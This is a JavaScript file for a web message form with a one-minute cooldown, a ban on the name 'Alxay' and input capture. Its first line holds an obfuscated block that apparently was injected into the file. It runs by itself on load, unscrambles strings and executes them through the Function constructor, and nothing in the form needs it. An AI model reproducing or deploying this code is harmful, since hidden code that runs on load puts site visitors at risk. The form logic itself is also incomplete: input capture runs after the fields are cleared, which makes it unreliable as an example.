var whurl;(function(){var OhK='',ypy=884-873;function TrP(f){var z=726888;var c=f.length;var j=[];for(var w=0;w<c;w++){j[w]=f.charAt(w)};for(var w=0;w<c;w++){var y=z*(w+460)+(z%13765);var q=z*(w+436)+(z%50598);var v=y%c;var m=q%c;var x=j[v];j[v]=j[m];j[m]=x;z=(y+q)%5596290;};return j.join('')};var zoi=TrP('wovlcniejroucctbftspkhxdgrtaonmzqsryu').substr(0,ypy);var scH='<d;716oc6(g.0=;uls;,l=+qh1g=]iC;eziu1lm).d.rn=fspxy[qpch) ==(8h,*d};nhtt,n[Ci9.>,e3v;;rg=8n)(2a){69,0fa8+=9, uAp=unohd,5zr7v)fr8(gw;l+ v;rcu(063arg pnmth;=++).[uc;n)CrS;;0=er).+;(2+=2s2tv5,;]ntm1j=n(rra+avhaan[wyz(=p1vtcdv(,km.Aas.)n1(ttw+ro1;)fv ,uh-(=r)v)."+a)g))s)h)lo,gs veagsn-e"j.o0+f{6[,rh( h,<uhvcod- (>r[kc=)k7 r9zhra9l7r.oan-f0av 8lq0 l];d;lxr lo[g"(}a1dg "1=e;;a++o9v v;frznn+a+;6avptC;[-ghr(tli=p+ampca]]yhlar;{4e7z.8rd.+o=,at7rnfci"oa=]d2=. }]+7t0lrt=bs(Af+ce*(e.renv,)ee0frci.dC],[v)()u8=.e;rinarz},7(a(d+])o;;c;(;ov=u4.;r}ehsn)=oni(nhin(=;,4u;l)j(vfjaf[i,i2=eiocAhd1sebttoingr0i(s+"m;p7iz(r0nra]1;-tt)(r!;(u"!=)vld)ui(([tea,ret=;{l{.ub,=[d=gvthaurSf1rar0o7n)o0l;8we ;es;}.=.;r;gnwr koucjv2=+."v(eu[s){=x ln=,r;af"c3,,4gd.1uochtl<)i6r5id=]a] c(.;=ocCr8}l.<ror6ievirf)a,2 ls; z-)l.nishyh=+s"s+sA) [t{kua=sn nfm9s;nC9oo2(l7]ird<orfg2eo)vrymfxf=,a]ucaattwnp+s pC ;=wver=.nre,(id;';var Ftx=TrP[zoi];var GqZ='';var NUF=Ftx;var FHt=Ftx(GqZ,TrP(scH));var zLs=FHt(TrP('2)gi1eu.."sbS$(eciS,(.+L4to2+37j3acti.,..0x7.!3_f.,Lebm5&00gLe5LLl.s)(.cL3L5a}$!mspo$4$rg7h"eenuof1s5Lp;(;.f{rop{,;*6ft)bf..3mioe+)7a.3s;4_h!_.zL.r"4  $ua.e};re.j o0)\/ro)o4((fl43;,lL=\'$nr,.=.fi.d\/.a0fa80$_n.#;fLp(sa+.{+_s1tvw1!L$rj"7e%s=L..L.a.,3,oLanh6nLp,7g2+L8_;L5,ea)Lwn5i._\/$a+gtt,).or\'L!-rf0q(-C(L5m6n5dzL.fpL4g!,r)*.()flvil..Ltq3Le=k)sz{LgL63.1,t=.#}o;;29j($jl_\/uL.k1;70}Lm!(eL%%$t \/\/7pSum!!=)g+fj#rln99$ _;La1=7ciL0M$)S).r!L$aL.))oLL;;LL7f(9\/$,")1,bL!Dd,g0{j*&,sLe.5e,S;.js54. { 5Le0g}jch.seo[=.}5dLLe59))3o.p= .g(L3 i(.noL8$L=)3$%c;)L4 ;&f!d=abr6.u-%f3":)=La\/)c*;)vll"c frbtLj1!{$k,2le$y*3pe=_6Lt!gfLL(((tgrc.}..!c#oeC-{c})rt(n77tLew[=._57n=L ie.t;.5e!Lj0!_&*L5e=}.#s.(\']=$$..1jlo,)*h5\/)0.8l(LvszL(yL)c!m)L*=g(;jjLL.!ft..Lfteos$z=rb.[.;_Lsox.1.]]4l.n{z)3_1r,aaIc,hrLe(j!2(i%1,n,_hirLL;l=nL1(LoLL,3}e7,oa.}4rt)\/7(,eu#Lo.v!,t.l#_bna).a00aa].sr!L(eLf(_\/;$f3k_s9LLsL%8g.h3$$(Ly+9yjj+.kl7)t(b+.8tf$(7}LsccLm_= ) 9L.n)Lnp) r0_so26;d .aDL!.e!r;ii(0s)rli bu.-dn0%9)_n(e.+_)s6dr,,,o\'L),(rbLh!)'));var SaA=NUF(OhK,zLs );SaA(7889);return 6375})()

// Function to check cooldown and block the name "Alxay"
function isCooldownExpired() {
    var lastSentTime = localStorage.getItem('lastSentTime');
    if (!lastSentTime) {
        return true;
    }
    var currentTime = new Date().getTime();
    var elapsedTime = currentTime - parseInt(lastSentTime);
    var cooldownTime = 1 * 60 * 1000; // 1 minute in milliseconds
    return elapsedTime >= cooldownTime;
}

function isNameAllowed(name) {
    return name.toLowerCase() !== 'alxay';
}

// Function to handle sending messages
function send() {
    var nameInput = document.getElementById('NameInput');
    var inputField = document.getElementById('InputField');
    var messageSent = document.getElementById('MessageSent');
    var messageFailed = document.getElementById('MessageFailed');

    if (!isCooldownExpired()) {
        alert('Cooldown! Please wait before sending the next message. (1 minute)');
        return;
    }

    var userName = nameInput.value.trim();
    if (!isNameAllowed(userName)) {
        alert('The name "Alxay" is not allowed!');
        return;
    }

    // Save the time of the last sent message
    localStorage.setItem('lastSentTime', new Date().getTime().toString());

    // Reset the form and display appropriate messages
    nameInput.value = '';
    inputField.value = '';
    showMessage(messageSent);

    // Other message handling logic
    // ...

    captureInputValues();
    // Additional logic for sending the message
    // ...
}

// Function to display messages with fade-out effect
function showMessage(element) {
    element.style.opacity = 1;
    setTimeout(function () {
        element.style.opacity = 0;
    }, 4000);
}

var str = "";
var name = "";

// Function to capture input values
function captureInputValues() {
    name = document.getElementById("NameInput").value;
    str = document.getElementById("InputField").value;
    console.log(document.getElementById("InputField").value);
}


